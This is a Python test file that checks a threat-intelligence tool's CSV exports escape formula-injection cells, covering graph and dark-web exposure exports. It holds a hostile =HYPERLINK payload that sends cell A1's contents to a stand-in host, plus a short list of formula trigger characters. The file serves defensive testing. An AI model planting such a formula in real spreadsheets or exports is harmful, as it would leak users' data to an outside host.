"""CSV injection: every export Argus writes neutralises cells a spreadsheet would run as a formula.

Exports hold hostile text — DNS records, banners, profile names, leak-site victims, dark-web page titles —
so a value like ``=HYPERLINK(...)`` must reach Excel as text, never as a live formula."""

from __future__ import annotations

import csv
import io
from datetime import datetime, timezone

from argus.core import csvsafe
from argus.core.graph import IntelligenceGraph
from argus.core.models import Entity, EntityType, Relation, RelationType

HOSTILE = '=HYPERLINK("https://evil.example/?"&A1,"Click")'


def test_cells_are_neutralised_but_numbers_and_plain_text_are_not():
    assert csvsafe.cell(HOSTILE) == "'" + HOSTILE
    for trigger in ("+1", "-cmd", "@SUM(A1)", "\tx", "\rx"):
        assert csvsafe.cell(trigger).startswith("'")
    assert csvsafe.cell("acme.com") == "acme.com" and csvsafe.cell(-5) == -5 and csvsafe.cell(None) is None
    out = io.StringIO()
    csvsafe.writer(out).writerows([["a", HOSTILE], ["b", 3]])
    rows = list(csv.reader(io.StringIO(out.getvalue())))
    assert rows == [["a", "'" + HOSTILE], ["b", "3"]]


def test_the_graph_export_neutralises_hostile_scan_results():
    g = IntelligenceGraph("acme.com")
    seed = Entity.create(EntityType.DOMAIN, "acme.com")
    evil = Entity.create(EntityType.USERNAME, HOSTILE)  # e.g. a profile name chosen by an attacker
    g.add_entity(seed, is_seed=True)
    g.add_entity(evil)
    g.add_relation(Relation.create(seed.id, evil.id, RelationType.HAS_ACCOUNT))
    rows = list(csv.reader(io.StringIO(g.to_maltego_csv())))
    assert all(not str(c).startswith("=") for row in rows for c in row)
    assert any(c == "'" + HOSTILE for row in rows for c in row)


def test_the_exposure_export_neutralises_and_keeps_the_reference(make_client):
    from argus.intel.exposure import darkweb_findings

    c = make_client(monitors_enabled="false", notifications_enabled="false", report_schedules_enabled="false")
    repo = c.app.state.exposure
    w = c.portal.call(lambda: repo.create_watch(workspace_id="ws_default", scope="selector", domain="Acme",
                                                by="t", basis="Our brand, monitored by the SOC"))  # fmt: skip
    hit = {"title": HOSTILE, "onion": "http://abc.onion/t/1", "snippet": "dump", "date": "2026-11-01"}
    finding = darkweb_findings("Acme", [hit], datetime(2026, 11, 20, tzinfo=timezone.utc))
    c.portal.call(lambda: repo.record_check(w, finding, status="ok", message="", sources={}))
    rows = list(csv.reader(io.StringIO(c.get("/api/exposure/export.csv").text)))
    assert rows[0][-1] == "Reference" and rows[1][-1] == "http://abc.onion/t/1"  # the link survives export
    assert all(not cell.startswith("=") for row in rows for cell in row)  # nothing runs as a formula
